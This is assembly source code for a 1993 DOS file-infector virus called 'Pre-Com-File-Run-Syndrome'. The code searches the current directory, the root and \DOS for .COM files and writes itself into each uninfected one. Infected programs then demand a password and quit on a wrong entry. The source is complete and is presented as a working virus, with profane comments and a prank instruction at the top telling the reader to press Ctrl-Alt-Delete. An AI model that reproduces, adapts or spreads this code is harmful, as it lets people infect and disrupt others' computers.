;
; If you are reading this, Your instructions are:
;
; HOLD CONTROL AND ALT THEN PRESS DELETE
;
; (hypnosis hypnosis hypnosis)
;
        page    ,132
        name    PCFRS
        title   Pre-Com-File-Run-Syndrome
        .radix  16
code    segment
        assume  cs:code,ds:code
        org     100

olddta  equ     80
virlen  equ     offset endcode - offset start
smalcod equ     offset endcode - offset transf
buffer  equ     offset endcode + 100
newdta  equ     offset endcode + 10
fname   =       newdta + 1E
virlenx =       offset endcode - offset start
;
;             000   00   000  000 0   0  00  000  000
;             0  0 0  0 0    0    0 0 0 0  0 0  0 0  0
;             000  0000  00   00  0 0 0 0  0 000  0  0
;             0    0  0    0    0 0 0 0 0  0 0  0 0  0
;             0    0  0 000  000   0 0   00  0  0 000
;                  -=- A TRUE PAIN IN THE ASS -=-
;
;
;    Written By:     NOT FUCKING LIKELY!
;    Distributed by: FUCK YOU!
;
;    Usage: Infects all .COM files in the active path, the root, and \DOS.
;    Then whenever any of these is run, asks for a password. The password
;    is "Ken Sent Me", from Leisure Suit Larry I. Ha fucking Ha...
;
;
;
;

start:
        jmp     cancer

        db      '%'
ident   dw      'VI'
counter db      0
success db      0
filname db      '\DOS\'
stuff   db      '0'  dup(10)
allcom1 db      '*.COM',0
allcom2 db      '\DOS\*.COM',0
allcom3 db      '\*.COM',0
vleng   dw      virlen
bkup    dw      0
n_10D   db      3               ;Unused
progbeg dd      ?
eof     dw      ?
handle  dw      ?

cancer:
        mov     ax,cs           ;Move program code
        add     ax,1000         ; 64K bytes forward
        mov     es,ax
        inc     [counter]
        mov     si,offset start
        xor     di,di
        mov     cx,virlen
        rep     movsb

        mov     dx,newdta       ;Set new Disk Transfer Address
        mov     ah,1A           ;Set DTA
        int     21

        mov     dx,offset allcom1        ;Search for '*.COM' files
        mov     cx,110b         ;Normal, Hidden or System
        mov     ah,4E           ;Find First file
        int     21
        mov     [bkup],0
        jc      next1           ;Quit if none found
        call    mainmess

next1:  mov     dx,offset allcom2        ;Search for '*.COM' files
        mov     cx,110b         ;Normal, Hidden or System
        mov     ah,4E           ;Find First file
        int     21
        mov     [bkup],5
        call    paths
        jc      next2           ;Quit if none found
        call    mainmess

next2:  mov     dx,offset allcom3        ;Search for '*.COM' files
        mov     cx,110b         ;Normal, Hidden or System
        mov     ah,4E           ;Find First file
        int     21
        mov     [bkup],1
        call    paths
        jc      go_on           ;Quit if none found
        call    mainmess
go_on:  jmp     continue


proc mainmess
mainlp: mov     dx,offset fname
        mov     ax,3D02         ;Open file in Read/Write mode
        int     21
        mov     [handle],ax     ;Save handle
        mov     bx,ax
        push    es
        pop     ds
        mov     dx,buffer
        mov     cx,0FFFF        ;Read all bytes
        mov     ah,3F           ;Read from handle
        int     21              ;Bytes read in AX
        add     ax,buffer
        mov     cs:[eof],ax     ;Save pointer to the end of file
        mov     si,dx
        add     si,03
find:   lodsb
        cmp     al,'%'
        jne     infect
        jmp     close
infect: xor     cx,cx           ;Go to file beginning
        mov     dx,cx
        mov     bx,cs:[handle]
        mov     ax,4200         ;LSEEK from the beginning of the file
        int     21
        jc      close           ;Leave this file if error occures

        mov     dx,0            ;Write the whole code (virus+file)
        mov     cx,cs:[eof]     ; back onto the file
        mov     bx,cs:[handle]
        mov     ah,40           ;Write to handle
        int     21

close:  mov     bx,cs:[handle]
        mov     ah,3E           ;Close the file
        int     21
        push    cs
        pop     ds              ;Restore DS
        mov     ah,4F           ;Find next matching file
        mov     dx,newdta
        int     21
        jc      done            ;Exit if all found
        cmp     bkup,0
        je      around
        call    paths
around: jmp     mainlp          ;Otherwise loop again
done:   ret
endp

PROC    PATHS
        push    es
        push    ds
        pop     es
        cld
        mov     di, offset filname
        mov     si, offset fname         ;this part puts
        add     di, bkup
@010:   lodsb
        cmp     al, 00
        je      @020
        stosb
        jmp     @010
@020:   stosb


        mov     si, offset filname
        mov     di, offset fname
@030:   lodsb
        cmp     al, 00
        je      @040
        stosb
        jmp     @030
@040:   stosb

        pop     es
        ret
ENDP    PATHS

continue:
        mov     dx,olddta       ;Restore old Disk Transfer Address
        mov     ah,1A           ;Set DTA
        int     21

        mov     si,offset transf        ;Move this part of code
        mov     cx,smalcod      ;Code length
        xor     di,di           ;Move to ES:0
        rep     movsb           ;Do it

        xor     di,di           ;Clear DI
        mov     word ptr cs:[progbeg],0
        mov     word ptr cs:[progbeg+2],es      ;Point progbeg at program start
        jmp     cs:[progbeg]    ;Jump at program start

transf:
        push    ds
        pop     es
        mov     si,buffer+100
        cmp     [counter],1
        jne     passw
        sub     si,200
passw:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di

        mov     dx,offset whatis
        call    wordout
        call    passwrd
        call    check

        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax

        jmp     exit

        db     'PreComFileRunSyndrome 1993'
save    db     'x' dup(30)
wrong   db     13,10, 'YOU HAVE ENTERED THE WRONG PASSWORD!! $'
whatis  db     13,10, 'ENTER THE PASSWORD: $'
pwrd    db      '_y�4gy��4ay'
PROC    WORDOUT

        push ax                         ;save register
        mov     ah,9h                   ;Set up the function number
        INT 21h                         ;call DOS interrupt 21 to display
                                        ;what is at ds:dx
        pop ax                          ;restore register
        ret                             ;return to caller
ENDP
PROC    WORDIN
        push ax                         ;save register
        mov     ah,1                    ;set up function number
        INT 21h                         ;call DOS interrupt to get the
                                        ;key pressed on keyboard
        mov     bl,al                   ;move value into bl for use later

        pop ax                          ;return reg. to former state
        ret                             ;return to caller
ENDP
PROC    PASSWRD

        cld
        mov     di,offset save

@@10:   call wordin
        mov     al,bl
        cmp     al,0dh
        je      @@20
        stosb
        jmp    @@10

@@20:   ret

ENDP    PASSWRD
PROC    CHECK

        mov     dx,offset pwrd
        mov     di,offset save
        mov     cx,8
        cld

@@30:   mov     si,di
        lodsb
        mov     bl,al
        mov     di,si
        mov     si,dx
        lodsb
        mov     dx,si
        sub     al,14
        cmp     al,bl
        jne     @@40
        loop    @@30
        jmp     @@50

@@40:   call    kill
@@50:   ret

ENDP    CHECK
PROC    KILL

        mov     dx,offset wrong
        call    wordout

        MOV AH, 04CH            ; Terminate with return code
        MOV AL, 57              ; return code
        INT 21H

        ret

ENDP    KILL
EXIT:


skip:
        mov     di,offset start
        mov     cx,0FFFF        ;Restore original program's code
        sub     cx,si
        rep     movsb
        mov     word ptr cs:[start],offset start
        mov     word ptr cs:[start+2],ds
        jmp     dword ptr cs:[start]    ;Jump to program start
endcode label   byte

        int     20                      ;Dummy program
        int     20                      ;???

        db      0                       ;Unused

code    ends
        end     start
